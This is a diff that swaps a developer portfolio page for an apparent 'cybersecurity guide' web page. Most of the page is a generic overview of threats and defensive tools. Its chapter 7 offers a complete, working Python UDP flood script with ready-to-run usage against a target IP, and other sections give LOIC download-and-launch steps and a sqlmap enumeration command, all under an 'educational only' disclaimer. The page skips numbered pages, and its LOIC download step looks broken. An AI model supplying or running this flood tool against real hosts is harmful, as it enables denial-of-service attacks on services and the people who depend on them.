@@ -1,318 +1,626 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Alex Rivera - Full-stack developer crafting elegant web experiences with modern technologies.">
-    <meta name="theme-color" content="#6366f1">
-    
-    <!-- Open Graph / Facebook -->
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="Alex Rivera - Full-Stack Developer">
-    <meta property="og:description" content="Full-stack developer crafting elegant web experiences with modern technologies.">
-    <meta property="og:url" content="https://yoursite.com">
-    
-    <!-- Twitter -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Alex Rivera - Full-Stack Developer">
-    <meta name="twitter:description" content="Full-stack developer crafting elegant web experiences with modern technologies.">
-    
-    <title>Alex Rivera - Full-Stack Developer</title>
-    
-    <!-- Google Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    
-    <link rel="stylesheet" href="styles.css">
+  <meta charset="UTF-8">
+  <title>krazedout</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: monospace, monospace;
+      background: #16181a;
+      color: #d4d4d4;
+      min-height: 100vh;
+      width: 100vw;
+      overflow-x: auto;
+    }
+    header {
+      text-align: center;
+      padding: 32px 16px 8px 16px;
+      font-size: 2rem;
+      letter-spacing: 2px;
+      font-weight: bold;
+      border-bottom: 1px solid #23272b;
+      background: #181a1b;
+      color: #f3f3f3;
+      position: sticky;
+      top: 0;
+      z-index: 5;
+    }
+    #container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 32px 16px 120px 16px;
+    }
+    pre, code {
+      background: #181a1b;
+      color: #d4d4d4;
+      font-size: 1em;
+      padding: 8px 12px;
+      border-radius: 3px;
+      overflow-x: auto;
+      margin-bottom: 16px;
+      border: 1px solid #23272b;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    .section-title {
+      font-size: 1.25em;
+      font-weight: bold;
+      letter-spacing: 1px;
+      margin: 28px 0 8px 0;
+      color: #e2e2e2;
+      border-left: 4px solid #44474b;
+      padding-left: 8px;
+    }
+    .footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #181a1b;
+      color: #888;
+      text-align: center;
+      padding: 8px 0 6px 0;
+      font-size: 0.95em;
+      border-top: 1px solid #23272b;
+      letter-spacing: 1px;
+      z-index: 10;
+    }
+    ul, ol {
+      margin-top: 0;
+      margin-bottom: 18px;
+      padding-left: 30px;
+    }
+    .toc {
+      background: #191b1c;
+      border: 1px solid #23272b;
+      padding: 12px 16px;
+      border-radius: 4px;
+      margin-bottom: 32px;
+    }
+    a, a:visited {
+      color: #57e7ff;
+      text-decoration: underline;
+      word-break: break-all;
+    }
+    .warning {
+      background: #2a1919;
+      border-left: 5px solid #e25353;
+      padding: 10px 18px;
+      color: #f6bcbc;
+      margin: 18px 0 18px 0;
+    }
+    .note {
+      background: #232b1e;
+      border-left: 5px solid #80e253;
+      padding: 10px 18px;
+      color: #d3f9b5;
+      margin: 18px 0 18px 0;
+    }
+    .tool-list {
+      columns: 2;
+      -webkit-columns: 2;
+      -moz-columns: 2;
+      gap: 28px;
+      font-size: 1em;
+      padding-left: 0;
+      list-style-type: none;
+      margin: 0 0 30px 0;
+    }
+    .tool-list li {
+      margin-bottom: 8px;
+      display: block;
+      break-inside: avoid;
+    }
+    @media (max-width: 900px) {
+      .tool-list { columns: 1; }
+      #container { padding-bottom: 120px; }
+    }
+    @media (max-width: 720px) {
+      #container { padding: 18px 4vw 130px 4vw; }
+      header { font-size: 1.2rem; }
+      .footer { font-size: 0.82em; }
+    }
+  </style>
 </head>
 <body>
-    <!-- Navigation -->
-    <nav class="nav" id="nav">
-        <div class="nav__container">
-            <a href="#hero" class="nav__logo">AR</a>
-            <div class="nav__links">
-                <a href="#about" class="nav__link">About</a>
-                <a href="#projects" class="nav__link">Projects</a>
-                <a href="#contact" class="nav__link">Contact</a>
-                <button class="theme-toggle" id="themeToggle" aria-label="Toggle dark mode">
-                    <svg class="theme-toggle__icon theme-toggle__icon--sun" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                    <svg class="theme-toggle__icon theme-toggle__icon--moon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                </button>
-            </div>
-        </div>
-    </nav>
+  <header>
+    ── COMPREHENSIVE CYBERSECURITY GUIDE ──
+  </header>
+  <div id="container">
+<pre>
+TABLE OF CONTENTS
+</pre>
+<div class="toc">
+<ul>
+  <li>Introduction to Cybersecurity</li>
+  <li>Why Cybersecurity Matters</li>
+  <li>Types of Cyber Threats
+    <ul>
+      <li>Malware</li>
+      <li>Phishing</li>
+      <li>Denial-of-Service (DoS) and Distributed DoS (DDoS)</li>
+      <li>Man-in-the-Middle (MitM) Attacks</li>
+      <li>SQL Injection</li>
+    </ul>
+  </li>
+  <li>Tools for Cyber Threat Analysis
+    <ul>
+      <li>Malware Analysis Tools (Wireshark, Windows Defender, YARA, Process Explorer, Autoruns)</li>
+      <li>Phishing Prevention Tools (SpamAssassin, PhishTank)</li>
+      <li>DoS/DDoS Mitigation and Testing Tools (Windows Firewall, Cloudflare, Snort, LOIC)</li>
+    </ul>
+  </li>
+  <li>Cybersecurity Best Practices</li>
+  <li>Cybersecurity Career Pathways</li>
+  <li>Bonus Section: Custom Fast DDoS Tool (Educational Only)</li>
+  <li>Appendices: References, Glossary, and Further Reading</li>
+</ul>
+</div>
+<pre>
+────────────────────────────── PAGE 1/49 ──────────────────────────────
+COMPREHENSIVE CYBERSECURITY GUIDE
 
-    <!-- Hero Section -->
-    <section class="hero" id="hero">
-        <div class="hero__container">
-            <div class="hero__avatar">
-                <div class="avatar-placeholder">AR</div>
-            </div>
-            <h1 class="hero__title">Alex Rivera</h1>
-            <p class="hero__tagline">
-                <span id="typingText"></span>
-                <span class="cursor">|</span>
-            </p>
-            <div class="hero__social">
-                <a href="https://github.com" target="_blank" rel="noopener noreferrer" class="social-link" aria-label="GitHub">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
-                    </svg>
-                </a>
-                <a href="https://linkedin.com" target="_blank" rel="noopener noreferrer" class="social-link" aria-label="LinkedIn">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
-                        <rect x="2" y="9" width="4" height="12"></rect>
-                        <circle cx="4" cy="4" r="2"></circle>
-                    </svg>
-                </a>
-                <a href="https://twitter.com" target="_blank" rel="noopener noreferrer" class="social-link" aria-label="Twitter">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
-                    </svg>
-                </a>
-            </div>
-            <a href="#contact" class="hero__cta">Get in touch</a>
-        </div>
-        <div class="hero__background"></div>
-    </section>
+INTRODUCTION
+Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These attacks are usually aimed at accessing, changing, or destroying sensitive information, extorting money from users, or disrupting normal business processes. In the age of cloud computing, mobile devices, and interconnected infrastructures, having a robust cybersecurity strategy is more critical than ever.
+────────────────────────────── PAGE 2/49 ──────────────────────────────
+WHY CYBERSECURITY IS IMPORTANT
 
-    <!-- About Section -->
-    <section class="about" id="about">
-        <div class="container">
-            <div class="section-header">
-                <h2 class="section-title">About Me</h2>
-            </div>
-            <div class="about__content">
-                <p class="about__text">
-                    I'm a full-stack developer passionate about building modern web applications that solve real problems. With 5+ years of experience, I specialize in creating scalable, performant solutions using cutting-edge technologies. I believe in writing clean, maintainable code and delivering exceptional user experiences.
-                </p>
-                <div class="skills">
-                    <span class="skill-pill">JavaScript</span>
-                    <span class="skill-pill">TypeScript</span>
-                    <span class="skill-pill">React</span>
-                    <span class="skill-pill">Node.js</span>
-                    <span class="skill-pill">Python</span>
-                    <span class="skill-pill">PostgreSQL</span>
-                    <span class="skill-pill">Docker</span>
-                    <span class="skill-pill">AWS</span>
-                    <span class="skill-pill">Git</span>
-                </div>
-            </div>
-        </div>
-    </section>
+Cyber threats have evolved rapidly with technology. In today’s digital world, both individuals and organizations face an expanding horizon of challenges. A robust cybersecurity strategy helps in:
+• Protecting personal and financial data
+• Ensuring business continuity
+• Safeguarding national security
+• Preventing identity theft
+By understanding the underlying threats and having the right tools and procedures in place, you can reduce risk and prepare for incidents before they occur.
+────────────────────────────── PAGE 3/49 ──────────────────────────────
+────────────────────────────── PAGE 4/49 ──────────────────────────────
+CHAPTER 1. INTRODUCTION TO CYBERSECURITY
 
-    <!-- Projects Section -->
-    <section class="projects" id="projects">
-        <div class="container">
-            <div class="section-header">
-                <h2 class="section-title">Featured Projects</h2>
-                <p class="section-subtitle">A selection of my recent work</p>
-            </div>
-            <div class="projects__grid">
-                <!-- Project 1 -->
-                <article class="project-card">
-                    <div class="project-card__image project-card__image--gradient-1">
-                        <div class="project-card__overlay">View Project</div>
-                    </div>
-                    <div class="project-card__content">
-                        <h3 class="project-card__title">CloudDash Analytics</h3>
-                        <p class="project-card__description">
-                            A real-time analytics dashboard for cloud infrastructure monitoring with customizable widgets and intelligent alerting.
-                        </p>
-                        <div class="project-card__tags">
-                            <span class="tag">React</span>
-                            <span class="tag">Node.js</span>
-                            <span class="tag">WebSockets</span>
-                        </div>
-                        <div class="project-card__links">
-                            <a href="https://demo.example.com" target="_blank" rel="noopener noreferrer" class="project-link">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
-                                    <polyline points="15 3 21 3 21 9"></polyline>
-                                    <line x1="10" y1="14" x2="21" y2="3"></line>
-                                </svg>
-                                Live Demo
-                            </a>
-                            <a href="https://github.com" target="_blank" rel="noopener noreferrer" class="project-link">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
-                                </svg>
-                                Repository
-                            </a>
-                        </div>
-                    </div>
-                </article>
+Cybersecurity involves defending our digital world—computers, networks, mobile devices, and cloud systems—from unauthorized access, damage, and disruption. In this chapter, we detail the evolution of cyber threats, why a proactive approach is needed, and how ethical hackers and security professionals work.
+Key topics discussed here include:
+– The evolution of cybercrime
+– The threat landscape across industries
+– The role and responsibility of the modern cybersecurity professional
+– The need for continuous learning and adaptation
 
-                <!-- Project 2 -->
-                <article class="project-card">
-                    <div class="project-card__image project-card__image--gradient-2">
-                        <div class="project-card__overlay">View Project</div>
-                    </div>
-                    <div class="project-card__content">
-                        <h3 class="project-card__title">TaskFlow Pro</h3>
-                        <p class="project-card__description">
-                            A collaborative task management platform with kanban boards, time tracking, and team analytics for remote teams.
-                        </p>
-                        <div class="project-card__tags">
-                            <span class="tag">TypeScript</span>
-                            <span class="tag">PostgreSQL</span>
-                            <span class="tag">Redis</span>
-                        </div>
-                        <div class="project-card__links">
-                            <a href="https://demo.example.com" target="_blank" rel="noopener noreferrer" class="project-link">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
-                                    <polyline points="15 3 21 3 21 9"></polyline>
-                                    <line x1="10" y1="14" x2="21" y2="3"></line>
-                                </svg>
-                                Live Demo
-                            </a>
-                            <a href="https://github.com" target="_blank" rel="noopener noreferrer" class="project-link">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
-                                </svg>
-                                Repository
-                            </a>
-                        </div>
-                    </div>
-                </article>
+Remember: Always practice ethical guidelines and obtain permission before testing or deploying any security measures on any network that you do not personally own.
+────────────────────────────── PAGE 5/49 ──────────────────────────────
+CHAPTER 2. WHY CYBERSECURITY MATTERS
 
-                <!-- Project 3 -->
-                <article class="project-card">
-                    <div class="project-card__image project-card__image--gradient-3">
-                        <div class="project-card__overlay">View Project</div>
-                    </div>
-                    <div class="project-card__content">
-                        <h3 class="project-card__title">DevDocs Hub</h3>
-                        <p class="project-card__description">
-                            An AI-powered documentation generator that automatically creates comprehensive docs from your codebase with smart search.
-                        </p>
-                        <div class="project-card__tags">
-                            <span class="tag">Python</span>
-                            <span class="tag">FastAPI</span>
-                            <span class="tag">OpenAI</span>
-                        </div>
-                        <div class="project-card__links">
-                            <a href="https://demo.example.com" target="_blank" rel="noopener noreferrer" class="project-link">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
-                                    <polyline points="15 3 21 3 21 9"></polyline>
-                                    <line x1="10" y1="14" x2="21" y2="3"></line>
-                                </svg>
-                                Live Demo
-                            </a>
-                            <a href="https://github.com" target="_blank" rel="noopener noreferrer" class="project-link">
-                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
-                                </svg>
-                                Repository
-                            </a>
-                        </div>
-                    </div>
-                </article>
-            </div>
-        </div>
-    </section>
+Today, nearly every facet of our lives is influenced by digital technology. Cyberattacks can lead to financial losses, privacy breaches, and even impact national security. In this chapter, we discuss:
+• Economic Impact: How breaches affect business revenue and reputation.
+• Personal Impact: Identity theft, data breaches, and loss of privacy.
+• National Impact: Cyber warfare, espionage, and infrastructure attacks.
+• The importance of a layered defense strategy: combining technology, policies, and human factors.
+Details on cybersecurity’s central role in keeping our digital society safe underpin every subsequent chapter.
+────────────────────────────── PAGE 6/49 ──────────────────────────────
+CHAPTER 3. TYPES OF CYBER THREATS
 
-    <!-- Contact Section -->
-    <section class="contact" id="contact">
-        <div class="container">
-            <div class="section-header">
-                <h2 class="section-title">Get In Touch</h2>
-                <p class="section-subtitle">Have a project in mind? Let's work together</p>
-            </div>
-            <div class="contact__content">
-                <div class="contact__info">
-                    <p class="contact__text">
-                        I'm always interested in hearing about new projects and opportunities. Whether you have a question or just want to say hi, feel free to reach out!
-                    </p>
-                    <a href="mailto:alex@example.com" class="contact__email">alex@example.com</a>
-                </div>
-                <form class="contact__form" id="contactForm" novalidate>
-                    <div class="form-group">
-                        <label for="name" class="form-label">Name</label>
-                        <input type="text" id="name" name="name" class="form-input" required>
-                        <span class="form-error" id="nameError"></span>
-                    </div>
-                    <div class="form-group">
-                        <label for="email" class="form-label">Email</label>
-                        <input type="email" id="email" name="email" class="form-input" required>
-                        <span class="form-error" id="emailError"></span>
-                    </div>
-                    <div class="form-group">
-                        <label for="message" class="form-label">Message</label>
-                        <textarea id="message" name="message" class="form-input form-textarea" rows="5" required></textarea>
-                        <span class="form-error" id="messageError"></span>
-                    </div>
-                    <button type="submit" class="form-submit">Send Message</button>
-                    <div class="form-message" id="formMessage"></div>
-                </form>
-            </div>
-        </div>
-    </section>
+An effective cybersecurity strategy starts by knowing your enemy. In this chapter, we provide an in-depth look at common cyber threats with specific examples and demonstrations.
+Section 3.1: MALWARE
+Malware is an umbrella term for malicious software, including viruses, worms, trojans, ransomware, and spyware. Each type operates differently and targets different components of a system.
+────────────────────────────── PAGE 7/49 ──────────────────────────────
+3.1. MALWARE – DEEP DIVE
 
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <p class="footer__text">&copy; 2025 Alex Rivera. Built with passion and clean code.</p>
-        </div>
-    </footer>
+Malware can:
+– Damage or disrupt system operations
+– Steal sensitive data
+– Provide unauthorized access
+– Encrypt your files for ransom
 
-    <script src="scripts.js"></script>
+Tools for Malware Analysis (Windows Environment):
+Wireshark (Packet Analysis): Installation: choco install wireshark Usage: Launch Wireshark and choose your network interface to capture traffic. Apply filters like “http” or “tcp.port==80” to isolate suspicious packets.
+Windows Defender (Antivirus and Threat Scanning): Commands: Get-MpThreatDetection Start-MpScan -ScanType QuickScan These commands will help detect and remediate common threats.
+────────────────────────────── PAGE 8/49 ──────────────────────────────
+3.1 (Cont’d): MALWARE TOOLS
+
+YARA (Advanced Pattern Matching for Malware): Installation: choco install yara Usage: Use YARA rules by running: yara -r malware_rules.yar C:\Users\
+Process Explorer (Advanced Task Manager): Installation and Run:
+Invoke-WebRequest -Uri "https://download.sysinternals.com/files/ProcessExplorer.zip" -OutFile "ProcessExplorer.zip"
+Expand-Archive -Path "ProcessExplorer.zip" -DestinationPath "C:\Tools\ProcessExplorer"
+Start-Process "C:\Tools\ProcessExplorer\procexp64.exe"
+Autoruns (Startup Program Analyzer): Installation and Run:
+Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Autoruns.zip" -OutFile "Autoruns.zip"
+Expand-Archive -Path "Autoruns.zip" -DestinationPath "C:\Tools\Autoruns"
+Start-Process "C:\Tools\Autoruns\autoruns64.exe"
+────────────────────────────── PAGE 9/49 ──────────────────────────────
+Section 3.2: PHISHING
+
+Phishing involves deceiving victims with fraudulent communications, often emails, that pretend to be from trusted sources. These messages coax users into providing sensitive data like usernames, passwords, or financial information.
+
+Phishing Prevention Tools:
+• SpamAssassin: choco install spamassassin
+• PhishTank: Visit PhishTank to check URLs against a database of known phishing sites.
+────────────────────────────── PAGE 10/49 ──────────────────────────────
+Section 3.3: DENIAL-OF-SERVICE (DoS) AND DISTRIBUTED DENIAL-OF-SERVICE (DDoS) ATTACKS
+
+DoS/DDoS attacks aim to overwhelm a network or server with traffic, rendering services unavailable. Techniques often include packet flooding and resource exhaustion attacks.
+
+Mitigation Strategies for Windows:
+Firewall Rules: netsh advfirewall firewall add rule name="Block Bad Traffic" dir=in action=block remoteip=192.168.1.100
+Cloud-Based Protection: Cloudflare for DDoS mitigation.
+Traffic Monitoring: NetFlow Analyzer tools help monitor network patterns and detect anomalies.
+Snort IDS: choco install snort Usage: snort -c C:\Snort\etc\snort.conf -i 1
+────────────────────────────── PAGE 11/49 ──────────────────────────────
+Section 3.3 (Cont’d): DDoS Testing for Educational Purposes
+
+Tools like LOIC (Low Orbit Ion Cannon) allow you to test your network’s resilience—but only use this on systems you are legally authorized to test.
+
+LOIC Setup Example (Windows):
+Invoke-WebRequest -Uri "https://github.com/NewEraCracker/LOIC/releases/latest" -OutFile "LOIC.zip"
+Expand-Archive -Path "LOIC.zip" -DestinationPath "C:\Tools\LOIC"
+Start-Process "C:\Tools\LOIC\LOIC.exe"
+WARNING: Unauthorized use of these tools is illegal.
+────────────────────────────── PAGE 12/49 ──────────────────────────────
+Section 3.4: MAN-IN-THE-MIDDLE (MITM) ATTACKS
+
+MITM attacks intercept and alter communications between two parties without their knowledge. These are often carried out on unsecured Wi‑Fi networks.
+Defense Mechanisms on Windows:
+– Enforce HTTPS Everywhere using proper SSL/TLS certificates.
+– Use ARP spoof detection tools such as XArp.
+– Enable Windows Defender Firewall and block unknown inbound connections.
+────────────────────────────── PAGE 13/49 ──────────────────────────────
+Section 3.5: SQL INJECTION
+
+SQL Injection exploits vulnerabilities in web applications that accept unsanitized user input. Attackers inject malicious SQL code to compromise databases and extract sensitive information.
+
+Prevention:
+• Use parameterized queries and prepared statements.
+• Employ web application firewalls (WAFs).
+Testing: SQLmap: python sqlmap.py -u "http://example.com?id=1" --dbs
+────────────────────────────── PAGE 14/49 ──────────────────────────────
+CHAPTER 4. TOOLS FOR CYBER THREAT ANALYSIS
+
+This chapter covers an extensive suite of tools available for analyzing, detecting, and remediating security threats. This section is separated into subcategories with step-by-step instructions on installation and usage.
+────────────────────────────── PAGE 15/49 ──────────────────────────────
+SECTION 4.1: MALWARE & PACKET ANALYSIS
+
+• Wireshark: choco install wireshark
+• tcpdump: sudo tcpdump -i eth0 (Linux)
+────────────────────────────── PAGE 16/49 ──────────────────────────────
+SECTION 4.2: ANTIVIRUS & MALWARE SCANNING
+
+• Windows Defender: Get-MpThreatDetection Start-MpScan -ScanType QuickScan
+• YARA: choco install yara; yara -r rules.yar "C:\Path\to\scan"
+────────────────────────────── PAGE 17/49 ──────────────────────────────
+SECTION 4.3: SYSTEM MONITORING & ANALYSIS
+
+• Process Explorer
+• Autoruns
+────────────────────────────── PAGE 18/49 ──────────────────────────────
+SECTION 4.4: PHISHING PREVENTION TOOLS
+
+• SpamAssassin: choco install spamassassin
+• PhishTank: verify URLs online
+────────────────────────────── PAGE 19/49 ──────────────────────────────
+SECTION 4.5: NETWORK INTRUSION & TRAFFIC MONITORING
+
+• Snort IDS: choco install snort
+• NetFlow Analyzer
+────────────────────────────── PAGE 20/49 ──────────────────────────────
+CHAPTER 5. CYBERSECURITY BEST PRACTICES
+
+Best Practices Include:
+• Use strong, unique passwords and rotate them regularly.
+• Enable multifactor authentication (MFA).
+• Keep software updated.
+• Encrypt sensitive data.
+• Employ VPNs.
+• Regularly test and patch systems.
+────────────────────────────── PAGE 21/49 ──────────────────────────────
+CHAPTER 6. CYBERSECURITY CAREER PATHWAYS
+
+Roles:
+• Security Analyst
+• Penetration Tester
+• Security Engineer
+• Incident Responder
+• Malware Analyst
+Certifications: CompTIA Security+, CEH, OSCP, eJPT, OSWE, GXPN
+────────────────────────────── PAGE 22/49 ──────────────────────────────
+Incident Responder: Handles breaches, develops IRPs.
+Malware Analyst: Uses tools like IDA Pro, OllyDbg.
+────────────────────────────── PAGE 23/49 ──────────────────────────────
+CHAPTER 7. CUSTOM FAST DDOS TOOL (EDUCATIONAL PURPOSES ONLY)
+
+DISCLAIMER: Educational use only. Never attack systems you do not own.
+
+Python UDP flood example (for lab only):
+</pre>
+<pre>
+#!/usr/bin/env python3
+import socket, random, time, sys
+def udp_flood(target_ip, target_port, duration):
+    timeout = time.time() + duration
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_to_send = random._urandom(1024)
+    packet_count = 0
+    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")
+    while time.time() < timeout:
+        try:
+            sock.sendto(bytes_to_send, (target_ip, target_port))
+            packet_count += 1
+        except Exception as e:
+            print("Error sending packet:", e)
+            break
+    sock.close()
+    print(f"\nFlood completed. Total packets sent: {packet_count}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Usage: python3 udp_flood.py <Target IP> <Target Port> <Duration in seconds>")
+        sys.exit(1)
+    target_ip = sys.argv[1]
+    target_port = int(sys.argv[2])
+    duration = int(sys.argv[3])
+    udp_flood(target_ip, target_port, duration)
+</pre>
+<pre>
+────────────────────────────── PAGE 24/49 ──────────────────────────────
+How to Use:
+python3 udp_flood.py 192.168.0.10 80 30
+Monitor target with Wireshark.
+────────────────────────────── PAGE 27/49 ──────────────────────────────
+CHAPTER 8. ADVANCED TOPICS AND TECHNIQUES
+
+• Buffer overflows and exploit development
+• Reverse engineering and malware analysis
+• Advanced intrusion detection system (IDS) configuration
+• Threat hunting methodologies
+• Machine learning in cybersecurity
+────────────────────────────── PAGE 28/49 ──────────────────────────────
+EXPLOIT DEVELOPMENT & BUFFER OVERFLOWS
+
+Lab: Make a C program with no input length check, debug in GDB or Immunity Debugger. Study ROP (Return Oriented Programming).
+────────────────────────────── PAGE 29/49 ──────────────────────────────
+REVERSE ENGINEERING AND MALWARE ANALYSIS
+
+Key tools:
+• IDA Pro / Ghidra (binary analysis)
+• OllyDbg (runtime debugger)
+Lab: Analyze sample binary in Ghidra.
+────────────────────────────── PAGE 30/49 ──────────────────────────────
+THREAT HUNTING AND INCIDENT RESPONSE
+
+• Use SIEM tools (Splunk, ELK) for log collection
+• Analyze patterns with ML
+• Develop IR playbooks
+────────────────────────────── PAGE 31/49 ──────────────────────────────
+DEFENSIVE MEASURES AND INCIDENT RESPONSE
+
+• Security Policies and Procedures
+• Network Segmentation and Access Controls
+• Regular Vulnerability Assessments
+• Incident Response Planning and Crisis Management
+• Recovery and Back-Up Strategies
+────────────────────────────── PAGE 32/49 ──────────────────────────────
+INCIDENT RESPONSE TOOLS
+
+• SIEM (Splunk, ELK)
+• EnCase, FTK, Autopsy (forensics)
+• Wireshark, tcpdump, NetFlow (network forensics)
+────────────────────────────── PAGE 33/49 ──────────────────────────────
+CYBERSECURITY STRATEGY IMPLEMENTATION
+
+• Risk Assessment and Management
+• Security Architecture Design
+• Employee Training and Awareness
+• Audits and Compliance
+• Advanced Technology (IDS/IPS, DLP, UEBA)
+────────────────────────────── PAGE 34/49 ──────────────────────────────
+LABS & TRAINING
+
+• VirtualBox/VMware for isolated labs
+• GNS3/Cisco Packet Tracer for network simulation
+• CTFs: Hack The Box, TryHackMe, VulnHub
+────────────────────────────── PAGE 35/49 ──────────────────────────────
+EMERGING TRENDS
+
+• AI/ML in threat detection
+• Cloud/container security
+• IoT security
+• Blockchain
+• Data protection laws (GDPR, CCPA)
+────────────────────────────── PAGE 36/49 ──────────────────────────────
+GOVERNANCE, RISK & COMPLIANCE
+
+• Data protection policies (PCI-DSS, HIPAA)
+• Audits, risk assessments, employee training
+────────────────────────────── PAGE 37/49 ──────────────────────────────
+THREAT INTELLIGENCE
+
+• OSINT, threat feeds, platforms (MISP, Yeti, TheHive)
+• Tools: Maltego, Shodan, SpiderFoot
+────────────────────────────── PAGE 38/49 ──────────────────────────────
+TRAINING, CERTS & CAREER DEV
+
+• Certs: CompTIA Security+, OSCP, CEH, eJPT, OSWE, GXPN
+• Conferences: DEF CON, Black Hat, BSides
+• Forums: r/netsec, r/hacking
